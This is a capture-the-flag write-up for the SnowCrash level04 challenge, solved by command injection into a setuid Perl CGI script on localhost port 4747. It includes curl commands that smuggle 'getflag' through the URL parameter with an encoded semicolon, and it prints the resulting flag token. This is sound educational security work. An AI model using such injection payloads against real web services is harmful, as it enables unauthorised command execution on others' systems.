# level04
We arrive in the home folder of user `level04` where a perl script called `level04.pl` awaits us.
Very much like before, its UID is `flag04`, its GID is `level04` and its perms are `rws r-s r-x`

Opening it up, it looks like a frugal CGI program, which will be joined via a webserver and would return the output of `echo <something>` on both STDIN and STDERR.

# Resolution
A commentary in the program implies it should be joinable on port 4747 of localhost.
Sure enough, a `netstat -pant` tells us that there is something running on port 4747 already!

Let's connect to it !
```sh
level04@SnowCrash:~$ curl -v 'localhost:4747'
* About to connect() to localhost port 4747 (#0)
*   Trying 127.0.0.1... connected
> GET / HTTP/1.1
[...]
< HTTP/1.1 200 OK
[...]
```
It works!
For now, the only response we get is a newline, since the `$y` variable in the `x` subroutine is most probably empty.

The last line of the program informs us that it's the content of the `"x"` param in the url that gets sent into the x subroutine and further to the echo instruction.
Hence
```sh
level04@SnowCrash:~$ curl 'localhost:4747?x=woof'
woof
```

But what if we were injecting something unintended into the echo instruction? Something like `echo coucou; getflag` would indeed print out the flag since the CGI program is being run as user `flag04 `.

So let's put that into the `"x"` param. But first, the ';' character has to be URL-encoded so that it's not stripped out before the shell instruction.
```sh
level04@SnowCrash:~$ curl 'localhost:4747?x=woof%3Bgetflag'
woof
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
